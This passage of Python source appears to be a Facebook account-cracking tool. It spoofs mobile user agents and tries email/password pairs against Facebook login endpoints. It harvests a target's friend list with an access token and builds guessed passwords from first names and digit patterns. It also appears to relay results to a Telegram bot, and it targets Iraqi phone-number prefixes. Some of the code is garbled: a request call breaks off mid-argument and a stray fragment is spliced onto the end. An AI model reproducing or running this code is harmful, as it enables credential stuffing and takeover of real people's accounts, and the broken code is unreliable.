ua_windows = 'Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.7.8) Gecko/20050511 Firefox/1.0.4;]'
        ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
        return [ua_intelmac,ua_nokia,ua_asus,ua_huawei,ua_vivo,ua_oppo,ua_samsung,ua_windows,ua_xiaomi]

class login: 
    def api1(em,pas):
        r = requests.Session()
        useragent=random.choice(user_agent.UG())
        header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": useragent,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        response = r.get('https://b-api.facebook.com/method/auth.login', params={'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}, headers=header)
        if 'session_key' in response.text and 'EAAA' in response.text:return({"status":"GOOD","email":em,"pass":pas})
        elif 'www.facebook.com' in response.json()['error_msg']:return({"status":"CHECKPOINT","email":em,"pass":pas})
        else:return({"status":"ERROR","email":em,"pass":pas})
    def api2(em,pas):
        ses = requests.Session()
        useragent=random.choice(user_agent.UG())
        headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":useragent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
        p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
        dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":em,"flow":"login_no_pin","pass":pas,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
        _headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
        po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data =
 dataa, if "c_user" in ses.cookies.get_dict():return({"status":"GOOD","email":em,"pass":pas})
        elif 'checkpoint' in ses.cookies.get_dict():return({"status":"CHECKPOINT","email":em,"pass":pas})
        else:return({"status":"ERROR","email":em,"pass":pas})
    def api3(em,pas):
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
        useragent=random.choice(user_agent.UG())
        br.addheaders = [('user-agent',useragent)]
        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +str(em)+ '&locale=en_US&password=' + str(pas) + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
        q = json.load(data)
        if 'access_token' in q:return({"status":"GOOD","email":em,"pass":pas})
        elif 'www.facebook.com' in q['error_msg']:return({"status":"CHECKPOINT","email":em,"pass":pas})
        else:return({"status":"ERROR","email":em,"pass":pas})

class main:
    def idclone(self):
        print(f'''{lightblack} -------------------------------V3-{white}''')
        T_ID=input(' Token ( Fb ) : ')
        print(f'''{lightblack} ----------------------------------{white}''')
        T_FB=input(' Target ID : ')
        print(f'''{lightblack} ----------------------------------{white}''')
        id=[]
        try:
            API=requests.get(f'https://graph.facebook.com/{T_FB}?fields=friends.limit(5001)&access_token={T_ID}').json()
            for i in API['friends']['data']:
                name=str(i['name']).split(' ')[0]
                idd=i['id']
                l=f'''{idd}:{name}111
{idd}:{name}1234
{idd}:{name}12345
{idd}:{name}123456
{idd}:1234512345
{idd}:123456123456
{idd}:1122334455
{idd}:112233445566
{idd}:{name}12
{idd}:{name}1234567
{idd}:{name}12345678
{idd}:{name}123456789
{idd}:{name}12345678910'''
                id.append(str(l))
            print('  Has been collect all ID :)')
            token=input(' Token ( Telegram BOT ) : ')
            id=input(' Telegram ID : ')
            TOKEN.clear()
            TOKEN.append(token)
            ID.clear()
            ID.append(id)
            print('\n  Please wait a few hours...')
            print(f'''{lightblack} ----------------------------------{white}''')
            TH=Pool(25)
            TH.map(run.loop,id)
        except:
            print('Your token doesn\'t work')
            input('\n Enter to Return:-')
            self.GO()
        input('\n Enter to Return:-')
        self.GO()
            
    def Nrandom(self):
        print(f'''{lightblack} ----------------------------------{white}''')
        print('  0770 - 0771 - 0772 - 0773 - 0774')
        print('  0750 - 0751 - 0752 - 0753 - 0754')
        print('  0780 - 0781 - 0782 - 0783 - 0784')
        print(f'''{lightblack} ----------------------------------{white}''')
        N=input(' Choice : ')
        if N=='0770' or N=='770':self.NUM='0770'
        elif N=='0771' or N=='771':self.NUM='0771'
        elif N=='0772' or N=='772':self.NUM='0772'
        elif N=='0773' or N=='773':self.NUM='0773'
        elif N=='0774' or N=='774':self.NUM='0774'
        elif N=='0750' or N=='750':self.NUM='0750'
        elif N=='0751' or N=='751':self.NUM='0751'
        elif N=='0752' or N=='752':self.NUM='0752'
        elif N=='0753' or N=='753':self.NUM='0753'
        elif N=='0754' or N=='754':self.NUM='0754'
        elif N=='0780' or N=='780':self.NUM='0780'
        elif N=='0781' or N=='781':self.NUM='0781'
        elif N=='0782' or N=='782':self.NUM='0782'
        elif N=='0783' or N=='783':self.NUM='0783'
        elif N=='0784' or N=='784':self.NUM='0784'
        else:
            self.logo()
            print(f'''{lightblack} -------------------------------V3-{white}=_headers, allow_redirects = False)
